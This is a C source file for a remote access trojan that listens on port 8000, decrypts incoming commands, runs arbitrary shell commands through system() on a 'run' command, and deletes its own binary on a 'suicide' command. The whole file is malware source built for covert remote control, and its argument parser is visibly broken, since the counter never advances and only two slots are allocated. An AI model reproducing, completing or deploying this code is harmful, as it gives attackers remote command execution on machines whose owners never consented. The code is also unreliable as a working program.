#include <clog/clog.h>
#include <crypt.h>
#include <net_util.h>
#include <rat_constants.h>

#define RAT_PORT 8000
#define DAEMON "RAT"

typedef int (*callback)(int, char **);
char *path_to_rat;

int no_op(int count, char **argv) { return RAT_ND; }

int suicide(int count, char **argv) {
  char *str = (char *)malloc(sizeof(char) * 1024);
  sprintf(str, "rm %s", path_to_rat);  // handle all os
  int status = system(str);
  return status < 0 ? RAT_ERR : RAT_OK;
}

int run(int count, char **argv) {
  if (count < 2) return RAT_INVALID;
  int status = system(argv[1]);
  return status < 0 ? RAT_ERR : RAT_OK;
}

static int compare_string(const char *s1, const char *s2) {
  return strncmp(s1, s2, strlen(s2));
}

callback hash_function(const char *str) {
  clog_i(DAEMON, str);
  if (compare_string(str, "suicide") == 0) {
    return suicide;
  } else if (compare_string(str, "run") == 0) {
    return run;
  } else {
    return no_op;
  }
}

char **str_args_parse(int *count, char *msg) {
  int i = 0;
  char **str = (char **)malloc(sizeof(char *) * 2);
  char *temp = strtok(msg, " ");
  while (temp != NULL) {
    str[i] = temp;
    temp = strtok(NULL, " ");
  }
  *count = i;
  return str;
}

int process(char *msg, int soc) {
  if (msg == NULL) return 0;
  int count = 0;
  char *decryptd_msg = rat_decrypt(msg);
  callback cb = hash_function(decryptd_msg);
  clog_i(DAEMON, "Received message: %s", decryptd_msg);
  char **args = str_args_parse(&count, decryptd_msg);
  char output = cb(count, args);
  write(soc, &output, 1);
  free(msg);
  free(args);
  return 1;
}

int main(int argc, char *argv[]) {
  path_to_rat = argv[0];
  clog_enable();
  int soc = start_server(RAT_PORT);
  if (soc == -1) {
    clog_e(DAEMON, "Cannot start rat");
    return -1;
  }
  clog_i(DAEMON, "Starting server...");
  int shouldRun = 1;
  while (shouldRun) {
    // process args and return output to server
    shouldRun = process(readln(soc), soc);  // this writes to client
  }
  return -1;
}